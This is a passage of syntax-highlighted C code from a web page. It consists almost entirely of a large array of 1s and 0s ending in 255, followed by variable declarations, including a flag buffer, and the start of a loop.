class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>,</span><br><span class="line">                    <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">255</span></span><br><span class="line">            &#125;;</span><br><span class="line">    <span class="type">int</span> idx = <span class="number">0</span>, idx_flag = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> c = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> flag[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">        <span 